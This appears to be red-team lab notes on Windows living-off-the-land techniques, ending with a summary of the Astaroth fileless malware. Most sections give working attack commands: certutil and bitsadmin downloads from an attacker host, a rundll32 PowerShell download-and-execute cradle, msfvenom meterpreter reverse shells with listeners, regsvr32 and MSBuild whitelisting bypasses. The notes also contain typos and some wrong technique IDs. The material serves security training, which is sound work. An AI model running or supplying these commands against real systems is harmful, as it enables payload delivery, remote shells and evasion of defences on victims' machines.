---
title: "Leaving Off the Land"
date: 2026-10-18
weight: 15
---

## 1. Overview
- What's Living Off the Land?
    - Living off the land is a trending term in red team community. The name is taken from real life, living by eating the available food on the land.
    - Similarly, adversaries and malware creators take advantage of target computer's built-in tools and utilities.
    - The Term "Living Off the Land" was introduced at DerbyCon3 in 2013 and has gained more traction in the red team community ever since, becoming anoften used and popular technique.
    - These built in tools perform various regular activities within target system or network capabilities. However they are increasingly used and abused, for example, using the CertUtil tool to download malicious files into the lab machine.
    - The primary idea is to use Microsoft-signed programs, scripts and libraries to blend in and evade defensive controls.
    - Red teamers do not want to get detected when executing their engagement activities on the target, so utilizing these tools is safer to maintain their stealth.
    - Following are some catogories that living off the land encompasses:
        - Reconnaissance
        - Files operations
        - Arbitary code execution
        - Lateral movement
        - Security product bypass

## 2. Windows Sysinternals
- Windows sysinternals is a set of tools and advanced system utilities developed to help IT professionals manage, troubleshoot, and diagnose the windows operating system in various advanced topics.
- Sysinternals suit is divided into various categories, including:
    - Disk management
    - Process management
    - Networking tools
    - System information
    - Security tools

- In order to use the windows sysinternals tools, we need to accept the microsoft software license terms of these tools. We can do this by passing the `-acceptla` at the command prompt or by gui during tool execution.
- The following are some of the popular sysinternal tools:

| Tool Name | DEscription |
|-----------|-------------|
| AccessChk | helps system administrators check specified access for files, directories, registry keys, global objects, and windows services |
| PsExec | a tool that executes programs on a remote system |
| ADExplorer | An advanced AD tool that helps to easily view and manage the AD database |
| ProcDump | Monitors running process for CPU spikes and ability to dump memory for further analysis |
| ProcMon | An essential tool for process monitoring |
| TCPView | A tool that lists all TCP and UDP connections |
| PsTools | The first tool designed in the sysinternals suite to help  list detailed information |
| Portmon | monitors and displays all serial and parallel port activity on system |
| Whois | providers information for specified domain name or IP address |

### 2.1 Sysinternals Live
- One of the great features of Windows sysinternals is that there is no installation required. Microsoft provides a windows sysinternals service live, with various ways to use and execute tools. We can access them and use them through 
    - WEb browser [link](https://live.sysinternals.com/)
    - Windows share
    - Command prompt
- In order to use these tools, you either download them or by entering the sysinternal live path `\\live.sysinternals.com\tools\` into the windows explorer.
![Sysinternal live](/resources_redteam/sysinternals_live.png)

- Since the attached VM do not have internet access, we pre-downloaded the sysinternal tools and placed them in the `C:\Tools\SysinternalsSuit\` directory.

### 2.2 Redteaming utilization
- Built in and sysinternals tools are helpful for system administrators, these tools are also used by hackers, malware, and pentesters due to the inherent trust they have with in the operating system. 
- This trust is beneficial for red teamers, who do not want to get detected or caught by any security control on the target system. therefore, these tools have been used to evade detection and other blue team controls.

## 3. LOLBAS Project
- LOLBAS stands for Living Off The Land Binaries And Scripts, a project's primary main goal is to gather and document the Microsoft-signed and built-in-tools used as Living Off The Land techniques, including binaries, scripts and libraries.
- The LOLBAS project is a community-driven repository gathering a collection of binaries, scripts, libraries that could be used for red team purposes. It allows to search based on binaries, functions, scripts, and ATT&CK info. 
- It is straighforward to look for a binary, including binary name will the result, however, if we want to look for specific function, we require providing a / before the function name. For example, if we are looking for all execute functioins, we should use `/execute`. Similarly in order to look based on types, we should use the # symbol followed by the type name. 
- The following are types included in the project
    - Script
    - Binary
    - Library
    - Other MS Binaries

## 4. File Operations
- This task shows commonly used tools based on functionalities and malware activities seen in the real world as well as in the red team enagagements.

### 4.1 Certutil
- Certutil is a windows built-in utility for handling certification services. It used to dump and disply certification authority (CA) configuration information and other CA components. Therefore, the tool's normal use is to retrieve certificate information. However, people found that certutil.exe could transfer and encode files unrelated certification services. MITRE ATT&CK framework identifies this technique as `Ingreee tool Transfer (T1104)`.
- To illustrate this with an example, we can use `certutil.exe` to download a file from a attacker's web server and store it in window's temperary folder, using the command below. Note that we use the `-urlcache` and `-split -f` parameters to enforce the tool to download from the provided URL  using split technique.
```powershell
certutil -URLcache -split -f http://ATTACKER_IP/payload.exe C:\Windows\Temp\payload.exe
# urlcache to display url, enalbes the url option to use in the command
# split and f to enforce fetching files from the provided URL
```

- Also, the `certutil.exe` can be used as an encoding tool where we can encode files and decode the content of files. ATT&Ck T1027 refers to this techniques to obfuscate files to make them difficult to discover or analyze.
```powershell
certutil -encode payload.exe Encoded-payload.txt
# encode to encode the file
# decode to decode the file
```

### 4.2 BITSAdmin
- The `bitsadmin` tool is a system administrator utility that can be used to create, download or upload background intelligent transfer service (BITS) jobs and check their progress. 
- BITS is a low bandwidth and asynchronous method to download and upload from HTTP webservers and SMB servers. Additional information about the `bitsadmin` tool can be found at [Microsoft Docs](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin)
- Attacker may abuse the BITS jobs to download and execute a malicious paload in a compromised machine. For more information about this technique, you may visit the ATT&CK [T1197](https://attack.mitre.org/techniques/T1197/) page.
```powershell
bitsadmin.exe /transfer /Download /priority Foreground http://ATTACKER_IP/payload.exe C:\Windows\Temp\payload.exe
# transfer to create a new job
# Download to download the file
# priority to set the priority of the job, in this case it is foreground
```

### 4.3 FindStr
- Findstr is a Microsoft built-in tools used to find text and string patterns. The Findstr tools is usefull in that helps users and system adminstrators to search within files and parsed output. For example, if we want to check whether port 8080 is open on our machine, then we can pipe the result of netstat to find that port as follows `netstat -an | findstr "8080"`

- However, an unintended way was found by using `findstr.exe` to download remote files from SMB shared folders within the network as follows, 
```powershell
# start smb server on your attacker machine
cp payload.exe ~/tmp/test.exe
# always use auth to bypass organization policy to block unauthorized networks
# smb2support to enable smb2 support
sudo impacket-smbserver share_name ~/tmp -smb2support -user admin -pass admin

# in your victim machime, try to authenticate to the smb server first with net
# clear connection cache first
net use * /delete /y
# list current connections
net use
# connect to the smb server
net use Z: \\ATTACKER_IP\share_name /user:admin admin
# when it shows completed successfully, lets test the
dir \\ATTACKER_IP\share_name
findstr /V dummystring \\ATTACKER_IP\share_name\test.exe > C:\Windows\Temp\test.exe
# /V to invert the search, meaning it will match lines that do not contain the pattern
```

## 5. File execution
- This task shows various ways of executing a binary within operating system. The typical case of executing a binary involves various known methods such as using the command line or from the desktop. 
- However, other ways exists to achieve payload executioin by abusing other system binaries, of which one of the reasons is to hide or harden payload's process. 
- Based on the MITRE ATT&CK framework, thie technique is called **Signed Binary Proxy Exeuction** or **Indirect Command execution**, where the attacker leverages other system tools to spawn malicious payloads. This technique also helps to evade defensive controls.

### 5.1 File Explorer
- File explorer is a file manager and system component for windows. People found that using the file explorer binary can execute other .exe files. This technique is called `Indirect command execution`, where the explorer.exe tool can be used and abused to lauch malicious scripts or executable from a trusted parent process.
- The explorer.exe binary is loacted at:
    - C:\Windows\explorer.exe for the windows-64 bit version
    - C:\Windows\SysWow64\explorer.exe for the windows-32 bit version
- In order to create a child process of `explorer.exe` parent, we can execute the following command:
```powershell
explorer.exe /root,"C:\Windows\System32\calc.exe"
# as a result, calculor popped on desktop along with the explorer.exe process
```

### 5.2 WMIC
- Windows management instrumentation (WMIC) is widows command line utility that manages windows components. People found that WMIC is also used to execute binaries for evading defensiv measures. The MITRE ATT&CK framework refers to this technique as `Signed Binary Execution(T1218)`.
```powershell
wmic.exe process call create calc
# This will spawn a calculator process as a child of wmic.exe
```

### 5.3 Rundll32
- Rundll32 is a microsoft built-in tool that loads and runs dynamic link libraries (DLL) files within operating system. A red team can abuse and leverage `rundll.exe` to run arbitary payloads and execute javascript and powershell scripts. The MITRE ATT&CK framework identifies this as `Signed Binary Proxy Execution: Rundll32` and refers to it as T1218.
- The `rundll.exe` binary is located at:
    - C:\Windows\System32\rundll32.exe for the windows-64 bit version
    - C:\Windows\SysWoW64\rundlle2.exe for the windows-32 bit version
- Now lets try to execute a `calc.exe` binary as proof of concept using the `rundll32.exe` binary
```powershell
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
```
- IN the previous command, we used the `rundll32.exe` binary that embeds a javascript component,`eval()`, to execute the `calc.exe` binary.
- As we mentioned previosly, we can also execute powershell scripts.
```powershell
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
```
- As a result of the previous execution, a copy of the script.ps1 downloaded into memory on the lab machine.

## 6. Application Whitelisting bypasses
- Application whitelisting is a microsoft endpoint security feature that prevents malicioius and unauthorized programs from executing in real time. Application whitelisting is rule-based, where it specifies a list of approved applications or executable files that are allowed to be present and executed on an operating system.
- this task focuses on LOLBAS examples that are used to bypass the Windows application whitelisting.
### 6.1 Regsvr32 
- Regsvr32 is a command line tool to register and unregister DLL in winodws registry. 
- regsvr.exe binary loaced at 
    - C:\Windows\System32\regsvr32.exe for the windows 32-bit version
    - C:\Windows\SysWoW64\regsvr32.exe for the windows 64-bit version
- Besides its indented use, `regsvr.exe` binary can also be used to execute arbitary binaries and bypass windows application whitelisting.
- According to the [Red Canary]() reports, the `regsvr32.exe binary is the third most popular ATT&CK technique.
- Adversaries leverage regsvr32.exe to execute native code or scripts locally or remotely, the technique used here is trusted by windows OS components and is executed in memory, which is one of the reasons why this is technique is  also used to bypass application whitelistng.
- Let's try to apply this technique in real life. First we need to create a malicious DLL file using the msvenom and setup our metasploit listener to receive a reverse shell. Note that we will creating a malicious file that works for 32bit operating systems. 
```powershell
# on the attacker machine
msvenom -p windows/meterpreter/reverse_tcp LHOST=AttackBox_IP LPORT=443 -f dll -a x86 > liveOfftheland.dll
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST AttackBox_IP; set LPORT 443; exploit"
#...
# wait for the reverse shell to connect..
#...
# and we also need to setup the http server to download the payload in the victim machine
python3 -m http.server 1337

# on the victim machine
# download the dll file
curl http://AttackBox_IP:1337/liveOfftheland.dll -o C:\Users\Public\liveOfftheland.dll
# execute the dll file
C:\Windows\System32\regsvr32.exe c:\Users\Public\liveOfftheland.dll
# or do this at one go...
# /s - silent mode
# /n - do not call DllRegister  server
# /u - unregister the dll
# /i:http://example.com/file.sct - to use another server since we are not using dll register server.
C:\Windows\SysWoW64\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\liveOfftheland.dll
# and we should get the reverse shell in our metasploit listener.
```
### 6.2 Bourne Again Shell (Bash)
- In 2016, Microsoft added support for Linux enviroment on windows 10,11 and server 2019. This feature is known as Windows Subsystem for Linux (WSL), and it exist in two WSL versions: WSL1 and WSL2. 
- WSL is a hyper-V virtualized linux distribution that runs on the operating, supporting a subset of the linux kernel and system calls. 
- This feature is an addon that user can install and interact with the linux distribution. As part of WSL, bash.exe is a microsoft tool for interacting with Linxu environment.
- People found ways to execute payloads and bypass the winodws application whitelisting sice it is a microsoft signed binary. By executing `base.exe -c "path-to-payload"`, we can execute any unsigned payload. 
- ATT&CK called this an `Indirect command execution` technique where attackers abuse the windows tools utility to obtain command executions. More information about this, you may visit [T1202](https://attack.mitre.org/techniques/T1202/).
- Note that youneed to enalbe and install WSL in windows 10 to user the bash.exe. Also the attached VM does not have Linux subsytem enabled due to nested virtualization restrictions.
- Keep in mind that this section highlighted a couple of interesting tools.



## 7. Other Techniques
### 7.1 Shortcuts
- Shortcuts or symbolic links are a technique used for reffering to other files or applications within operating systems.
- Once a user clicks on the shortcut file, the reference file or application is executed.
- MIRTRE ATT&CK calls this technique as **Shortcut modification** [T1547.001](https://attack.mitre.org/techniques/T1547/001/)
- To use the shortcut modification, we can set the target of the shortcut to execute following files
    - Rundll32
    - Powershell
    - Regsvr32
    - Executable on disk

### 7.2 No Powershell
- In 2019, Red canary published a threat detection report stating that powershell is most used technique for malicious activities. Therefore, organizations started monitoring or blocking `powershell.exe` from being executed. As a result, adversaries find other ways to run powershell code without spawing it.
- `PowerLessShell` is a python-based tool that generates malicious code to run on a lab machine without showing an instance of powershell process. PowerLessShell relies on abusing the Microsoft Build engine (MSBuild.exe), a platform for building windows applications, to execute remote code.
```powershell
# First let's downlaod a copy of project from github repo onto the Attacker machine
git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git

# Generate a reverse shell - powershell payload using `msfvenom`
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackerIP LPORT=4443 -f psh-reflection > liveOff.ps1
# run the listner
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_winhttps; set LHOST AttackerIP; set LPORT 4443; exploit"
# wait here for reverse shell connection

# we need make sure this powershell payload generated by msfvenom is compatible with MSBuild.exe
cd PowerLessShell
python2 PowerLessShell.py -type powershell -source ..\liveOff.ps1 -o payload.csproj
# Once the payload.csproj is generated, we need to transfer this to windows machine. 
# We can do this by scp or setting http server.
# and finally, we build the payload.csproj file and wait for the reverse shell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe payload.csproj
# Once we run this, wait a couple of secnds till we receive a shell.
# Also make sure that there will be no powershell.exe process is running...
```


## 8. Real life Scenerio
- This section introduces showcase of malware that used the techniques discussed in this article.
- In 2017, The windows defender threat protection ([Windows Defender ATP](https://www.microsoft.com/security/blog/2018/11/15/whats-new-in-windows-defender-atp/)) research team discovered a fileless malware named `Astaroth`. 
- A flle less malware means that the malware runs and it is executed in the system without writing to the disk. The malware performs all its functions from the victim device's memory.
- Astaroth is known as an information stealer, which takes sensitive information from victims users, such as account credentials, keystrokes, and other data, and sends it to the attacker. 
- The malware relies on various advanced techniques such as anti-debugging, anti-virtualization, anti-emulation tricks, process hollowing, NTFS Alternate Data Streams (ADS), and living off the land binaries to perform different functions.
- In the intial access stage, attackers rely on a spam campaign that contain malicious attachment files, the attached file is an LNK file shortcut, once the victim has clicked it, will result in the following.
    - WMIC command is executed to download and run javascript code
    - Abusing the BITS admin multiple binaries from the command and control server. Interestingly, in some cases, the malware uses Youtube channel description to their C2 server commands.
    - Using BITS Admin, ADS technique, to hide their binaries within system for their persitence.
    - A certutil tool is used to decode a couple of downloaded payloads into dll files.
    - The dll files are executed using Regsvr32

- For more details about the malware, and detections, we suggest checking the following references:
    - [Astaroth: Banking Trojan](https://www.armor.com/resources/threat-intelligence/astaroth-banking-trojan/)
    - [Microsoft Discovers Fileless Malware compain dropping Astaroth info stealer](https://www.trendmicro.com/vinfo/de/security/news/cybercrime-and-digital-threats/microsoft-discovers-fileless-malware-campaign-dropping-astaroth-info-stealer)
    - [Astaroth malware hides command servers in Youtube channel descriptions](https://www.zdnet.com/article/astaroth-malware-hides-command-servers-in-youtube-channel-descriptions/)






























